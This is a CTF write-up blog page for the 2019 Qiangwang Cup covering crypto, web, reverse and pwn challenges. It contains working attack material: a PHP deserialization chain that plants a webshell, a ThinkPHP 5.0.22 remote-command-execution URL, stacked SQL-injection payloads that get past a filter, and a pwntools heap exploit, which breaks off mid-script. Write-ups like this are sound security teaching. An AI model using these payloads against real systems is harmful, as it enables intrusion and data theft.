@@ -1,0 +1,827 @@
+<!DOCTYPE html>
+
+
+
+
+<html class="theme-next gemini" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="MISC签到题复制官方给的flag提交 CRYPTO强网先锋-辅助下载附件，题目给出了flag的rsa加密算法，给出了e，n，c，要求出d才能进行解密，但是随机数p，q太大，不能直接用在线工具进行质数分解n，下面还提供了一个加密算法，已知n，并且e，q相同，通过百度找到一个算法，可以通过gcd()求出一个因数，然后再求出另一个：12345678910111213def gcd(a, b):   i">
+<meta property="og:type" content="article">
+<meta property="og:title" content="故人梦">
+<meta property="og:url" content="http://yoursite.com/2019/05/28/第三届强网杯writeup/index.html">
+<meta property="og:site_name" content="故人梦">
+<meta property="og:description" content="MISC签到题复制官方给的flag提交 CRYPTO强网先锋-辅助下载附件，题目给出了flag的rsa加密算法，给出了e，n，c，要求出d才能进行解密，但是随机数p，q太大，不能直接用在线工具进行质数分解n，下面还提供了一个加密算法，已知n，并且e，q相同，通过百度找到一个算法，可以通过gcd()求出一个因数，然后再求出另一个：12345678910111213def gcd(a, b):   i">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://k-ring.github.io/img/1.jpg">
+<meta property="og:image" content="https://k-ring.github.io/img/2.jpg">
+<meta property="og:image" content="https://k-ring.github.io/img/3.jpg">
+<meta property="og:image" content="https://k-ring.github.io/img/4.jpg">
+<meta property="og:image" content="https://k-ring.github.io/img/5.jpg">
+<meta property="og:image" content="https://k-ring.github.io/img/sbz1.png">
+<meta property="og:image" content="https://k-ring.github.io/img/sbz2.png">
+<meta property="og:image" content="https://k-ring.github.io/img/sbz3.png">
+<meta property="og:image" content="https://k-ring.github.io/img/sbz4.png">
+<meta property="og:image" content="https://k-ring.github.io/img/sbz5.png">
+<meta property="og:image" content="https://k-ring.github.io/img/sbz6.png">
+<meta property="og:image" content="https://k-ring.github.io/img/sbz7.png">
+<meta property="og:image" content="https://k-ring.github.io/img/sbz8.png">
+<meta property="og:image" content="https://k-ring.github.io/img/1.png">
+<meta property="og:updated_time" content="2019-05-28T11:46:55.925Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="故人梦">
+<meta name="twitter:description" content="MISC签到题复制官方给的flag提交 CRYPTO强网先锋-辅助下载附件，题目给出了flag的rsa加密算法，给出了e，n，c，要求出d才能进行解密，但是随机数p，q太大，不能直接用在线工具进行质数分解n，下面还提供了一个加密算法，已知n，并且e，q相同，通过百度找到一个算法，可以通过gcd()求出一个因数，然后再求出另一个：12345678910111213def gcd(a, b):   i">
+<meta name="twitter:image" content="https://k-ring.github.io/img/1.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/05/28/第三届强网杯writeup/">
+
+
+
+
+
+  <title> | 故人梦</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">故人梦</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">至今朝，忆往昔、</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-resources">
+          <a href="/resources/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-modx"></i> <br>
+            
+            资源
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-link">
+          <a href="/link/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-link"></i> <br>
+            
+            友链
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/05/28/第三届强网杯writeup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="故人梦">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="故人梦">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline"></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-05-28T19:46:24+08:00">
+                2019-05-28
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  1,889 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  9 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><h4 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h4><p>复制官方给的flag提交</p>
+<h3 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h3><h4 id="强网先锋-辅助"><a href="#强网先锋-辅助" class="headerlink" title="强网先锋-辅助"></a>强网先锋-辅助</h4><p>下载附件，题目给出了flag的rsa加密算法，给出了e，n，c，要求出d才能进行解密，但是随机数p，q太大，不能直接用在线工具进行质数分解n，下面还提供了一个加密算法，已知n，并且e，q相同，通过百度找到一个算法，可以通过gcd()求出一个因数，然后再求出另一个：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">def gcd(a, b):</span><br><span class="line">   if a &lt; b:</span><br><span class="line">     a, b = b, a</span><br><span class="line">   while b != 0:</span><br><span class="line">     temp = a % b</span><br><span class="line">     a = b</span><br><span class="line">     b = temp</span><br><span class="line">   return a</span><br><span class="line">n1=14967030059975114950295399874185047053736587880127990542035765201425779342430662517765063258784685868107066789475747180244711352646469776732938544641583842313791872986357504462184924075227433498631423289187988351475666785190854210389587594975456064984611990461126684301086241532915267311675164190213474245311019623654865937851653532870965423474555348239858021551589650169602439423841160698793338115204238140085738680883313433574060243600028500600824624358473403059597593891412179399165813622512901263380299561019624741488779367019389775786547292065352885007224239581776975892385364446446185642939137287519945974807727</span><br><span class="line">n2=14624662628725820618622370803948630854094687814338334827462870357582795291844925274690253604919535785934208081825425541536057550227048399837243392490762167733083030368221240764693694321150104306044125934201699430146970466657410999261630825931178731857267599750324918610790098952520113593130245010530961350592735239454337631927669542026935873535964487595433984902529960726655481696404006628917922241666148082741874033756970724357470539589848548704573091633917869387239324447730587545472564561496724882799495186768858324490838169123077051890332313671220385830444331578674338014080959653201802476516237464651809255679979</span><br><span class="line">print &quot;p: &quot;+str(gcd(n1,n2))</span><br><span class="line">print &quot;q1: &quot;+str(n1/gcd(n1,n2))</span><br><span class="line">print &quot;q2: &quot;+str(n2/gcd(n1,n2))</span><br></pre></td></tr></table></figure></p>
+<p>求出p，q之后就可以求出d：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d = gmpy2.invert(e, (p-1)*(q-1))</span><br></pre></td></tr></table></figure></p>
+<p>然后使用私钥解密：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">m = pow(c, d, n)</span><br></pre></td></tr></table></figure></p>
+<p>再使用long_to_bytes(m)转一下就可以得到flag。<br>python脚本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf8 -*-</span><br><span class="line"></span><br><span class="line">import gmpy2</span><br><span class="line">from Crypto.Util.number import long_to_bytes</span><br><span class="line"></span><br><span class="line">def gcd(a, b):</span><br><span class="line">    if a &lt; b:</span><br><span class="line">        a, b = b, a</span><br><span class="line">    while b != 0:</span><br><span class="line">        temp = a % b</span><br><span class="line">        a = b</span><br><span class="line">        b = temp</span><br><span class="line">    return a</span><br><span class="line"></span><br><span class="line">n1 = 1496703005997511495029539987418504705373658788012799054203576520142577934243066251776506325878468586810706678947574718024471135264646977673293854464158384</span><br><span class="line">231379187298635750446218492407522743349863142328918798835147566678519085421038958759497545606498461199046112668430108624153291526731167516419021347424531101962</span><br><span class="line">365486593785165353287096542347455534823985802155158965016960243942384116069879333811520423814008573868088331343357406024360002850060082462435847340305959759389</span><br><span class="line">1412179399165813622512901263380299561019624741488779367019389775786547292065352885007224239581776975892385364446446185642939137287519945974807727</span><br><span class="line">n2 = 1462466262872582061862237080394863085409468781433833482746287035758279529184492527469025360491953578593420808182542554153605755022704839983724339249076216</span><br><span class="line">773308303036822124076469369432115010430604412593420169943014697046665741099926163082593117873185726759975032491861079009895252011359313024501053096135059273523</span><br><span class="line">945433763192766954202693587353596448759543398490252996072665548169640400662891792224166614808274187403375697072435747053958984854870457309163391786938723932444</span><br><span class="line">7730587545472564561496724882799495186768858324490838169123077051890332313671220385830444331578674338014080959653201802476516237464651809255679979</span><br><span class="line"></span><br><span class="line"># print(&quot;q: &quot; + str(gcd(n1, n2)))</span><br><span class="line"># print(&quot;p1: &quot; + str(n1/gcd(n1, n2)))</span><br><span class="line"># print(&quot;p2: &quot; + str(n2/gcd(n1, n2)))</span><br><span class="line"></span><br><span class="line">e = 65537</span><br><span class="line">q = gcd(n1, n2)</span><br><span class="line">p1 = n1/gcd(n1, n2)</span><br><span class="line">p2 = n2/gcd(n1, n2)</span><br><span class="line">c = 24820838937466182485444267370237504001245434520824363343985049860235017106394020609491066932794628969688390297120993362359762215715646429002408277747191995</span><br><span class="line">331240539531579198508382140219349074806334415773162638530112325183929049830280521558621542644011081249684040988239466918117989527471942372905813238686666373576</span><br><span class="line">046930150790075555949742455595555188191408440204984874326849469227412320532498945754177960670906551227023061348482202579432976454614774880868048560183239867969</span><br><span class="line">99103385565540496534422406390355987976815450744535949785073009043007159496929187184338592859040917546122343981520508220332785862546608841127597</span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(e, (q-1)*(p1-1))</span><br><span class="line">m = pow(c, d, n1)</span><br><span class="line">flag = long_to_bytes(m)</span><br><span class="line"></span><br><span class="line">print(&quot;flag is: &quot; + flag)</span><br></pre></td></tr></table></figure></p>
+<h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><h4 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h4><p>访问 <a href="http://www.tar.gz" target="_blank" rel="noopener">www.tar.gz</a> 可下载源码<br>打开如下：<br><img src="https://k-ring.github.io/img/1.jpg" alt><br>查看application目录，发现题目各功能源码：<br><img src="https://k-ring.github.io/img/2.jpg" alt><br>Profile.php文件里发现题目上次功能代码，但经过分析，上传功能无绕过。<br>但是此处发现了两个魔法方法：__call，__get。<br><img src="https://k-ring.github.io/img/3.jpg" alt><br>关键代码：<code>$this-&gt;{$this-&gt;{$name}}($arguments);</code></p>
+<p>发现在此处，我们可以控制$name的值达到执行Profile类里的任意函数的功能。<br>因此猜测本题可能与反序列化有关。</p>
+<p>回到本文件的其他函数，发现upload_img函数中存在利用点：<code>@copy($this-&gt;filename_tmp, $this-&gt;filename);</code>，假如我们对$this-&gt;filename_tmp和$this-&gt;filename进行控制，我们可以上传一个php图片马，然后通过此处生成一个php木马。</p>
+<p>向上跟踪，发现在此处$this-&gt;filename_tmp和$this-&gt;filename和进行的赋值：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if(!empty($_FILES))&#123;</span><br><span class="line">            $this-&gt;filename_tmp=$_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];</span><br><span class="line">            $this-&gt;filename=md5($_FILES[&apos;upload_file&apos;][&apos;name&apos;]).&quot;.png&quot;;</span><br><span class="line">            $this-&gt;ext_check();</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+<p>但是此处我们可以发现，我们控制$_FILES为空时，可以绕过此处的赋值。<br>所以，由此可以推断此题必与反序列化有关，此题的利用链为：<br><code>__call()-&gt;upload_img()-&gt;@copy</code></p>
+<p>去其他文件搜索反序列化的点，发现在Index文件里有如下代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">public function login_check()&#123;</span><br><span class="line">        $profile=cookie(&apos;user&apos;);</span><br><span class="line">        if(!empty($profile))&#123;</span><br><span class="line">            $this-&gt;profile=unserialize(base64_decode($profile));</span><br><span class="line">            $this-&gt;profile_db=db(&apos;user&apos;)-&gt;where(&quot;ID&quot;,intval($this-&gt;profile[&apos;ID&apos;]))-&gt;find();</span><br><span class="line">            if(array_diff($this-&gt;profile_db,$this-&gt;profile)==null)&#123;</span><br><span class="line">                return 1;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                return 0;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>发现，login_check函数会对我们的cookie值进行反序列化，但是仅仅是反序列化Profile类的话，是不能进入__call方法的，所以此处直接反序列化Profile类不能进入利用链。<br>翻看其他文件，发现在Register文件里有__destruct()方法：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        if(!$this-&gt;registed)&#123;</span><br><span class="line">            $this-&gt;checker-&gt;index();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>此处对$this-&gt;checker调用了index()方法，而此处的$this-&gt;checker在__construct()中被定义成Index类。<br>但是，假如我们控制反序列化字符串，使之反序列化Register类，控制$this-&gt;checker为Profile类，就可以对Profile类调用index()方法，而在Profile类中不存在此方法，就会进入__call方法，从而进入利用链。</p>
+<p>同时，由于我们需要控制$name为upload_img。此处为index，由此我们可以想到Profile的__get方法：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public function __get($name)</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;except[$name];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>由于Profile中没有index变量，就会调用此方法，而我们控制$this-&gt;except[$name]的值为upload_img，就可以将$this-&gt;{$name}赋值为upload_img，从而进入利用链。<br>poc：<br>在Index文件中的index()函数中，我们添加如下代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$w = new Profile();</span><br><span class="line">$w-&gt;except=array(&apos;index&apos;=&gt;&apos;upload_img&apos;);</span><br><span class="line">$w-&gt;ext=&apos;png&apos;;</span><br><span class="line">$w-&gt;filename_tmp=&apos;upload/9862a5f0c459c3f78ba4bab12279ea3d/b1a224c24d78e208556d6206b9ec7c72.png&apos;;</span><br><span class="line">$w-&gt;filename=&apos;upload/9862a5f0c459c3f78ba4bab12279ea3d/qwe.php&apos;;</span><br><span class="line">$q-&gt;checker=$w;</span><br><span class="line">echo base64_encode(serialize($q));</span><br></pre></td></tr></table></figure>
+<p>就会的到payload，再将payload放于cookie中，刷新界面，就可以在上传目录中生成qwe.php文件<br><img src="https://k-ring.github.io/img/4.jpg" alt><br>此时用菜刀链接即可，最终可以在根目录下发现flag<br><img src="https://k-ring.github.io/img/5.jpg" alt></p>
+<h4 id="强网先锋-上单"><a href="#强网先锋-上单" class="headerlink" title="强网先锋-上单"></a>强网先锋-上单</h4><p>打开网址，进入到public目录显示是thinkphp5.0.22，直接拿网上的命令执行的poc打就行了：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://49.4.26.104:30467/1/public/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat%20/flag</span><br></pre></td></tr></table></figure></p>
+<p>就可以得到flag。  </p>
+<p>也可以通过访问日志，可以看到别人的攻击日志：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://49.4.26.104:30467/1/runtime/log/201903/12.log</span><br></pre></td></tr></table></figure></p>
+<h4 id="随便注"><a href="#随便注" class="headerlink" title="随便注"></a>随便注</h4><p>进过尝试发现过滤了如下<br><img src="https://k-ring.github.io/img/sbz1.png" alt><br>然后绕不过去，想起sql堆叠注入，尝试堆叠注入，然后不报错，证明猜想正确<br>结合预编译然后十六进制编码得到结果<br>先获取数据库，在本地<br><img src="https://k-ring.github.io/img/sbz2.png" alt><br>用如下payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://117.78.60.139:32437/?inject=1%27%3B set @sql=0x73656C6563742064617461626173652829%3Bprepare stmt from @sql%3B execute stmt%23</span><br></pre></td></tr></table></figure></p>
+<p>发现对set 与prepare有拦截，大小写可以绕过<br><img src="https://k-ring.github.io/img/sbz3.png" alt><br>然后获取数据库的payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://117.78.60.139:32437/?inject=1%27%3B Set @sql=0x73656C6563742064617461626173652829%3BPrepare stmt from @sql%3B execute stmt%23</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://k-ring.github.io/img/sbz4.png" alt><br>按照如下获取表的方法<br><img src="https://k-ring.github.io/img/sbz5.png" alt><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Payload:</span><br><span class="line">http://117.78.60.139:32437/?inject=1%27%3B Set @sql=0x73686F77207461626C6573%3BPrepare stmt from @sql%3B execute stmt%23</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://k-ring.github.io/img/sbz6.png" alt><br>获取flag<br><img src="https://k-ring.github.io/img/sbz7.png" alt><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Payload:</span><br><span class="line">http://117.78.60.139:32437/?inject=1%27%3B Set @sql=0x73656C65637420666C61672066726F6D20603139313938313039333131313435313460%3BPrepare stmt from @sql%3B execute stmt%23</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://k-ring.github.io/img/sbz8.png" alt></p>
+<h3 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h3><h4 id="强网先锋-AD"><a href="#强网先锋-AD" class="headerlink" title="强网先锋_AD"></a>强网先锋_AD</h4><p>经过分析for循环之前的函数是简单的base64编码，于是对encode字符串进行base64解码，便可以得到flag。<br><img src="https://k-ring.github.io/img/1.png" alt></p>
+<h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><h4 id="强网先锋-AP"><a href="#强网先锋-AP" class="headerlink" title="强网先锋-AP"></a>强网先锋-AP</h4><p>这个题比较简单，就直接上脚本吧：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">def run():</span><br><span class="line">    s.recvuntil(&quot;Choice &gt;&gt; \n&quot;)</span><br><span class="line">    s.sendline(&quot;1&quot;)</span><br><span class="line">    s.recvuntil(&quot;The length of my owner&apos;s name:\n&quot;)</span><br><span class="line">    s.sendline(&quot;16&quot;)</span><br><span class="line">    s.recvuntil(&quot;Give me my owner&apos;s name:\n&quot;)</span><br><span class="line">    s.send(&apos;a&apos;*15+&apos;\n&apos;)</span><br><span class="line"></span><br><span class="line">    s.recvuntil(&quot;Choice &gt;&gt; \n&quot;)</span><br><span class="line">    s.sendline(&quot;3&quot;)</span><br><span class="line">    s.recvuntil(&quot;it&apos;s owner&apos;s name?\n&quot;)</span><br><span class="line">    s.sendline(&quot;0&quot;)</span><br><span class="line">    s.recvuntil(&quot;The length of my owner&apos;s name:\n&quot;)</span><br><span class="line">    s.sendline(&quot;40&quot;)</span><br><span class="line">    s.recvuntil(&quot;Give me my owner&apos;s name:\n&quot;)</span><br><span class="line">    s.send(&apos;a&apos;*24 + p64(0xfc1))</span><br><span class="line"></span><br><span class="line">    s.recvuntil(&quot;Choice &gt;&gt; \n&quot;)</span><br><span class="line">    s.sendline(&quot;1&quot;)</span><br><span class="line">    s.recvuntil(&quot;The length of my owner&apos;s name:\n&quot;)</span><br><span class="line">    s.sendline(&quot;8192&quot;)</span><br><span class="line">    s.recvuntil(&quot;Give me my owner&apos;s name:\n&quot;)</span><br><span class="line">    s.send(&apos;a&apos;*15+&apos;\n&apos;)</span><br><span class="line"></span><br><span class="line">    s.recvuntil(&quot;Choice &gt;&gt; \n&quot;)</span><br><span class="line">    s.sendline(&quot;1&quot;)</span><br><span class="line">    s.recvuntil(&quot;The length of my owner&apos;s name:\n&quot;)</span><br><span class="line">    s.sendline(&quot;24&quot;)</span><br><span class="line">    s.recvuntil(&quot;Give me my owner&apos;s name:\n&quot;)</span><br><span class="line">    s.send(&apos;\n&apos;)</span><br><span class="line"></span><br><span class="line">    s.recvuntil(&quot;Choice &gt;&gt; \n&quot;)</span><br><span class="line">    s.sendline(&quot;2&quot;)</span><br><span class="line">    s.recvuntil(&quot;open?\n&quot;)</span><br><span class="line">    s.send(&quot;2\n&quot;)</span><br><span class="line"></span><br><span class="line">    s.recvuntil(&quot;my owner!\n&quot;)</span><br><span class="line">    ttt = u64(s.recvn(8)[:-2].ljust(8, &apos;\x00&apos;))</span><br><span class="line">    base = ttt - 0x3c4000 - 0xb0a</span><br><span class="line">    addr = base + libc.symbols[&quot;system&quot;]</span><br><span class="line">    sh = base + 